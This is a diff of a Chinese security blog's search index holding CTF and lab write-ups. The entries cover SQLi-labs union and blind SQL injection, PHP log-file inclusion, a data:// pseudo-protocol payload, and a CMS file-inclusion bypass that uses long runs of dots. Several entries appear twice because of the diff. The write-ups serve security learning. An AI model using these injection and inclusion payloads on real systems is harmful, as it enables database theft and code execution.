-<p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670049789991-89b569c6-8529-425e-82dd-e0ca640ec250.png" alt="img"></p>
-<p>union select 爆出错误所在位置</p>
-<p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670049861866-cc2d9ab8-3a5f-487f-9d30-f67157882aef.png" alt="img"></p>
-<p>查看数据库和版本信息</p>
-<p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670049969075-8d212a9d-ad4f-479d-8cdf-45f94f024175.png" alt="img"></p>
-<p>爆表名</p>
-<p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670050221439-05f64900-187c-4cf3-b513-a995209eeaf8.png" alt="img"></p>
-<p>爆列名</p>
-<p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670050905009-87111a35-1ac5-4c9e-87fa-9a4cd7d466c0.png" alt="img"></p>
-<p>爆数据</p>
-<p>0x3a： 0x是十六进制标志，3a是十进制的58，是ascii中的 ‘:’ ，用以分割pasword和username。</p>
-<h3 id="Less-2-GET-Error-based-Intiger-based-基于错误的GET整型注入"><a href="#Less-2-GET-Error-based-Intiger-based-基于错误的GET整型注入" class="headerlink" title="Less-2 GET - Error based - Intiger based (基于错误的GET整型注入)"></a>Less-2 GET - Error based - Intiger based (基于错误的GET整型注入)</h3><p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670070233672-120a1495-bf5e-4bed-ae81-ee1eebb6ee0b.png" alt="img"></p>
-<p>id=1 and 1=1 不报错，可知整形注入</p>
-<p>其余步骤与第一关一样，不加’与注释符号</p>
-<h3 id="Less-3-GET-Error-based-Single-quotes-with-twist-string-基于错误的GET单引号变形字符型注入"><a href="#Less-3-GET-Error-based-Single-quotes-with-twist-string-基于错误的GET单引号变形字符型注入" class="headerlink" title="Less-3 GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)"></a>Less-3 GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)</h3><p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670070788475-ba305d81-a326-4993-a092-268b2ae50601.png" alt="img"></p>
-<p>报错数字1的后面多了），可疑</p>
-<p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670070854475-317596fe-0224-4f50-83a0-3a0bc4554087.png" alt="img"></p>
-<p>所以是‘）绕过</p>
-<p>后续步骤与第一关一样</p>
-<h3 id="Less-4-GET-Error-based-Double-Quotes-String-（基于错误的GET双引号字符型注入）"><a href="#Less-4-GET-Error-based-Double-Quotes-String-（基于错误的GET双引号字符型注入）" class="headerlink" title="Less-4 GET - Error based - Double Quotes - String （基于错误的GET双引号字符型注入）"></a>Less-4 GET - Error based - Double Quotes - String （基于错误的GET双引号字符型注入）</h3><p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670071003645-fd581b22-0a46-44af-8fa4-7690181e23fc.png" alt="img"></p>
-<p>这都不报错，有点顽固</p>
-<p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670073776067-f4c2622c-3701-4210-8a6b-f9ce6ff0995a.png" alt="img"></p>
-<p>看到一个），可疑</p>
-<p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670073797643-e6506375-d53b-433d-9292-b8ae1ea98849.png" alt="img"></p>
-<p>其余步骤和第一关一样</p>
-<h3 id="对前四关总结"><a href="#对前四关总结" class="headerlink" title="对前四关总结"></a>对前四关总结</h3><p>前四关都是再id=1的基础上加一个或两个符号，可以根据报错来判断需要用什么符号来绕过。</p>
-<p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670074546797-aba5906a-1ee3-4127-a7f2-b50a91da31ba.png" alt="img">以此为例，报错语句中   ‘’1’’)LIMIT0,1’     </p>
-<p>简要分析，除掉两端的单引号 则为 ‘1’’)LIMIT0,1 ，可以看出1的右边多了’)，我们输入的为?id=1’</p>
-<p>所以可以分解为   ‘1’    ‘)    LIMIT0,1    ,中间的‘是sql语句中本身就带着的，被我们前面加上的’给挤到后面了，所以sql中还多了一个），这一个）就是为了闭合（</p>
-<p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670074970572-d6471fcf-929d-4986-9a7a-4eaf3d4a646b.png" alt="img"></p>
-<p>1为我们加的闭合字符，2为sql语句中的原有字符</p>
-<p>所以判断为’)闭合</p>
-<h3 id="Less-5-GET-Double-Injection-Single-Quotes-String-双注入GET单引号字符型注入"><a href="#Less-5-GET-Double-Injection-Single-Quotes-String-双注入GET单引号字符型注入" class="headerlink" title="Less-5 GET - Double Injection - Single Quotes - String (双注入GET单引号字符型注入)"></a>Less-5 GET - Double Injection - Single Quotes - String (双注入GET单引号字符型注入)</h3><h3 id="sql盲注知识点"><a href="#sql盲注知识点" class="headerlink" title="sql盲注知识点"></a>sql盲注知识点</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">left(database(),1)&gt;’s’        //left()函数</span><br></pre></td></tr></table></figure>
-
-<p>Explain:database()显示数据库名称，left(a,b)从左侧截取 a 的前 b 位</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">ascii</span>(<span class="title function_ invoke__">substr</span>((select table_name information_schema.tables where tables_schema=<span class="title function_ invoke__">database</span>()limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">101</span> --+</span><br></pre></td></tr></table></figure>
-
-<p>//substr()函数，ascii()函数</p>
-<p>Explain：substr(a,b,c)从 b 位置开始，截取字符串 a 的 c 长度。Ascii()将某个字符转换</p>
-<p>为 ascii 值</p>
-<p>▲ascii(substr((select database()),1,1))=98</p>
-<p>▲ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER</p>
-<p>BY id LIMIT 0,1),1,1))&gt;98%23</p>
-<p>//ORD()函数，MID()函数</p>
-<p>Explain：mid(a,b,c)从位置 b 开始，截取 a 字符串的 c 位</p>
-<p>Ord()函数同 ascii()，将字符转为 ascii 值</p>
-<p>left(version(),1)=5  查看version()第一位是不是5</p>
-<p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670075852822-badc8924-cffa-46c1-a0f1-b932e3d9238d.png" alt="img"></p>
-<p>length(database())=8 查看database()是否为8位</p>
-<p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670075936145-605ace9e-1831-4ecf-b81f-0be9826c542d.png" alt="img"></p>
-<p> left(database(),8)=’security’ 查看数据库是否为security</p>
-<p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670076538200-5e118c45-dd13-417f-ab6a-ad3e1f78956f.png" alt="img"></p>
-<p>ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101</p>
-<p>此处 table_schema 可以写成 =’security’，但是我们这里使用的 database()，是因为此处 database()就是 security。此处同样的使用二分法进行测试，直到测试正确为止。此处应该是 101，因为第一个表示 email。</p>
-<p>substr(a,b,c)从b位置开始，截取a的c位</p>
-<p>limit 0,1表示的是从第一条记录开始，只取一条即可</p>
-<p>limit 5,10表示的是从第五条记录开始，取十条记录，取到第16条记录</p>
-<p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670076947845-a854c8e2-b57f-495f-989e-f3388fb9136a.png" alt="img"></p>
-<p>第五关第六关操作差不多</p>
-<p>剩下的不写了，都差不多</p>
-<p><a href="https://blog.csdn.net/hxhxhxhxx/article/details/107643024">https://blog.csdn.net/hxhxhxhxx/article/details/107643024</a></p>
-<p><a href="https://www.cnblogs.com/-qing-/p/11610385.html#_label0">https://www.cnblogs.com/-qing-/p/11610385.html#_label0</a></p>
-]]></content>
-      <categories>
-        <category>sql注入</category>
-      </categories>
-      <tags>
-        <tag>靶场</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>(UA头文件包含)ctfshow 80 日志文件包含</title>
     <url>/2023/01/07/UA%E5%A4%B4%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-ctfshow-80-%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
     <content><![CDATA[<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">\# -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@Last</span> Modified time: 2020-09-16 11:26:29</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -669,6 +669,30 @@
 ]]></content>
       <categories>
         <category>命令执行</category>
+      </categories>
+      <tags>
+        <tag>web漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>(data伪协议利用)[SWPUCTF 2021 新生赛]PseudoProtocols</title>
+    <url>/2023/01/07/data%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-PseudoProtocols/</url>
+    <content><![CDATA[<p><img src="/2023/01/07/data%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-PseudoProtocols/1670983882058-c9be0e2d-b933-4549-b15f-170fe2f23f25.png" alt="img"></p>
+<span id="more"></span>
+
+<p>利用filter伪协议读取hint.php文件</p>
+<p><img src="/2023/01/07/data%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-PseudoProtocols/1670983908738-ca366767-a56c-4b08-8b1d-411cb75c93b4.png" alt="img"></p>
+<p><img src="/2023/01/07/data%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-PseudoProtocols/1670983956595-161766cb-00be-42f6-ba3a-b2c76b0ab005.png" alt="img"></p>
+<p><img src="/2023/01/07/data%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-PseudoProtocols/1670983975968-8e569827-467c-4454-a3eb-f87d4bdd8d0e.png" alt="img"></p>
+<p>分析代码</p>
+<p>ini_set(“max_execution_time”, “180”);通过“ini_set(“max_execution_time”,”180”);”增加脚本执行时间。</p>
+<p>if(isset($a)&amp;&amp;(file_get_contents($a,’r’)) === ‘I want flag’)   //a参数利用file_get_contents()函数只读形式打开，打开后内容要与”I want flag”字符串相匹配，才能执行下面的文件包含$file参数。</p>
+<p>看到用的是file_get_contents()函数打开text参数，以及后面的文件包含函数，自然的想到php伪协议中的data://协议。</p>
+<p>构造?a=data://text/plain;base64,SSB3YW50IGZsYWc= 。得到flag。</p>
+<p><img src="/2023/01/07/data%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-PseudoProtocols/1670984151591-43784152-bee8-4420-979b-9b1684688eb9.png" alt="img"></p>
+]]></content>
+      <categories>
+        <category>文件包含</category>
       </categories>
       <tags>
         <tag>web漏洞</tag>
@@ -718,30 +742,6 @@
 <p>param1[]=1&amp;param2[]=2</p>
 <p><img src="/2023/01/07/easy-md5-%E5%A4%8D%E7%8E%B0/1670940412975-67720e4c-a2f3-422b-92f0-b74c3b8be055.png" alt="img"></p>
 <p>得到flag：    NSSCTF{fb498f88-84ad-4543-8225-dc7536c24cf6}</p>
-]]></content>
-      <categories>
-        <category>文件包含</category>
-      </categories>
-      <tags>
-        <tag>web漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>(data伪协议利用)[SWPUCTF 2021 新生赛]PseudoProtocols</title>
-    <url>/2023/01/07/data%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-PseudoProtocols/</url>
-    <content><![CDATA[<p><img src="/2023/01/07/data%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-PseudoProtocols/1670983882058-c9be0e2d-b933-4549-b15f-170fe2f23f25.png" alt="img"></p>
-<span id="more"></span>
-
-<p>利用filter伪协议读取hint.php文件</p>
-<p><img src="/2023/01/07/data%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-PseudoProtocols/1670983908738-ca366767-a56c-4b08-8b1d-411cb75c93b4.png" alt="img"></p>
-<p><img src="/2023/01/07/data%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-PseudoProtocols/1670983956595-161766cb-00be-42f6-ba3a-b2c76b0ab005.png" alt="img"></p>
-<p><img src="/2023/01/07/data%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-PseudoProtocols/1670983975968-8e569827-467c-4454-a3eb-f87d4bdd8d0e.png" alt="img"></p>
-<p>分析代码</p>
-<p>ini_set(“max_execution_time”, “180”);通过“ini_set(“max_execution_time”,”180”);”增加脚本执行时间。</p>
-<p>if(isset($a)&amp;&amp;(file_get_contents($a,’r’)) === ‘I want flag’)   //a参数利用file_get_contents()函数只读形式打开，打开后内容要与”I want flag”字符串相匹配，才能执行下面的文件包含$file参数。</p>
-<p>看到用的是file_get_contents()函数打开text参数，以及后面的文件包含函数，自然的想到php伪协议中的data://协议。</p>
-<p>构造?a=data://text/plain;base64,SSB3YW50IGZsYWc= 。得到flag。</p>
-<p><img src="/2023/01/07/data%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-PseudoProtocols/1670984151591-43784152-bee8-4420-979b-9b1684688eb9.png" alt="img"></p>
 ]]></content>
       <categories>
         <category>文件包含</category>
@@ -1628,6 +1628,41 @@ https://blog.csdn.net/weixin_39190897/article/details/85334893]]></content>
       </tags>
   </entry>
   <entry>
+    <title>指定后缀文件包含（.php后缀）与 指定前缀文件包含（files）</title>
+    <url>/2023/01/07/%E6%8C%87%E5%AE%9A%E5%90%8E%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88-php%E5%90%8E%E7%BC%80%EF%BC%89%E4%B8%8E-%E6%8C%87%E5%AE%9A%E5%89%8D%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88files%EF%BC%89/</url>
+    <content><![CDATA[<p><img src="/2023/01/07/%E6%8C%87%E5%AE%9A%E5%90%8E%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88-php%E5%90%8E%E7%BC%80%EF%BC%89%E4%B8%8E-%E6%8C%87%E5%AE%9A%E5%89%8D%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88files%EF%BC%89/1672910232518-495a690a-4783-427c-a775-eda71d6f1c4e.png" alt="img"></p>
+<span id="more"></span>
+
+<p><img src="/2023/01/07/%E6%8C%87%E5%AE%9A%E5%90%8E%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88-php%E5%90%8E%E7%BC%80%EF%BC%89%E4%B8%8E-%E6%8C%87%E5%AE%9A%E5%89%8D%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88files%EF%BC%89/1672910568528-ca80407a-37d5-46c5-9a65-d353be949613.png" alt="img"></p>
+<p><img src="/2023/01/07/%E6%8C%87%E5%AE%9A%E5%90%8E%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88-php%E5%90%8E%E7%BC%80%EF%BC%89%E4%B8%8E-%E6%8C%87%E5%AE%9A%E5%89%8D%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88files%EF%BC%89/1672910692582-83b88d68-0c51-4de8-ac64-86e6b897102b.png" alt="img"></p>
+<p><img src="/2023/01/07/%E6%8C%87%E5%AE%9A%E5%90%8E%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88-php%E5%90%8E%E7%BC%80%EF%BC%89%E4%B8%8E-%E6%8C%87%E5%AE%9A%E5%89%8D%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88files%EF%BC%89/1672917386671-e8576ed5-a7c2-4445-b76c-152bf817402b.png" alt="img"></p>
+<h2 id="熊海cms文件包含漏洞-指定前缀files"><a href="#熊海cms文件包含漏洞-指定前缀files" class="headerlink" title="熊海cms文件包含漏洞(指定前缀files/)"></a>熊海cms文件包含漏洞(指定前缀files/)</h2><?php
+
+//单一入口模式
+
+error_reporting(0); //关闭错误显示
+
+$file=addslashes($_GET['r']); //接收文件名
+
+$action=$file==''?'index':$file; //判断为空或者等于index
+
+include('files/'.$action.'.php'); //载入相应文件
+
+?>
+
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>两个index.php文件均为以下内容，代码中对GET传参只进行了一个 addslashes过滤操作，但该操作对预防文件包含没有什么作用，我们只需要在对应的files文件下存在以 .php结尾的文件，即可利用文件名(不包含.php后缀)作为参数 r的内容，达到文件包含的目的</p>
+<p>由于用了 addslashes函数所以不能用%00截断来绕过.php后缀</p>
+<p>可以用………（256个.）</p>
+<p>或者././././(256个./)绕过</p>
+]]></content>
+      <categories>
+        <category>文件包含</category>
+      </categories>
+      <tags>
+        <tag>web漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>(文件上传+命令执行)BUU UPLOAD COURSE</title>
     <url>/2023/01/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-BUU-UPLOAD-COURSE/</url>
     <content><![CDATA[<p><img src="/2023/01/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-BUU-UPLOAD-COURSE/1671158113792-baa4586e-7558-4d92-b3dc-e9554a91fe2f.png" alt="img"></p>
@@ -1743,41 +1778,6 @@ https://blog.csdn.net/weixin_39190897/article/details/85334893]]></content>
 ]]></content>
       <categories>
         <category>文件上传</category>
-      </categories>
-      <tags>
-        <tag>web漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>指定后缀文件包含（.php后缀）与 指定前缀文件包含（files）</title>
-    <url>/2023/01/07/%E6%8C%87%E5%AE%9A%E5%90%8E%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88-php%E5%90%8E%E7%BC%80%EF%BC%89%E4%B8%8E-%E6%8C%87%E5%AE%9A%E5%89%8D%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88files%EF%BC%89/</url>
-    <content><![CDATA[<p><img src="/2023/01/07/%E6%8C%87%E5%AE%9A%E5%90%8E%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88-php%E5%90%8E%E7%BC%80%EF%BC%89%E4%B8%8E-%E6%8C%87%E5%AE%9A%E5%89%8D%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88files%EF%BC%89/1672910232518-495a690a-4783-427c-a775-eda71d6f1c4e.png" alt="img"></p>
-<span id="more"></span>
-
-<p><img src="/2023/01/07/%E6%8C%87%E5%AE%9A%E5%90%8E%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88-php%E5%90%8E%E7%BC%80%EF%BC%89%E4%B8%8E-%E6%8C%87%E5%AE%9A%E5%89%8D%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88files%EF%BC%89/1672910568528-ca80407a-37d5-46c5-9a65-d353be949613.png" alt="img"></p>
-<p><img src="/2023/01/07/%E6%8C%87%E5%AE%9A%E5%90%8E%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88-php%E5%90%8E%E7%BC%80%EF%BC%89%E4%B8%8E-%E6%8C%87%E5%AE%9A%E5%89%8D%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88files%EF%BC%89/1672910692582-83b88d68-0c51-4de8-ac64-86e6b897102b.png" alt="img"></p>
-<p><img src="/2023/01/07/%E6%8C%87%E5%AE%9A%E5%90%8E%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88-php%E5%90%8E%E7%BC%80%EF%BC%89%E4%B8%8E-%E6%8C%87%E5%AE%9A%E5%89%8D%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88files%EF%BC%89/1672917386671-e8576ed5-a7c2-4445-b76c-152bf817402b.png" alt="img"></p>
-<h2 id="熊海cms文件包含漏洞-指定前缀files"><a href="#熊海cms文件包含漏洞-指定前缀files" class="headerlink" title="熊海cms文件包含漏洞(指定前缀files/)"></a>熊海cms文件包含漏洞(指定前缀files/)</h2><?php
-
-//单一入口模式
-
-error_reporting(0); //关闭错误显示
-
-$file=addslashes($_GET['r']); //接收文件名
-
-$action=$file==''?'index':$file; //判断为空或者等于index
-
-include('files/'.$action.'.php'); //载入相应文件
-
-?>
-
-<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>两个index.php文件均为以下内容，代码中对GET传参只进行了一个 addslashes过滤操作，但该操作对预防文件包含没有什么作用，我们只需要在对应的files文件下存在以 .php结尾的文件，即可利用文件名(不包含.php后缀)作为参数 r的内容，达到文件包含的目的</p>
-<p>由于用了 addslashes函数所以不能用%00截断来绕过.php后缀</p>
-<p>可以用………（256个.）</p>
-<p>或者././././(256个./)绕过</p>
-]]></content>
-      <categories>
-        <category>文件包含</category>
       </categories>
       <tags>
         <tag>web漏洞</tag>
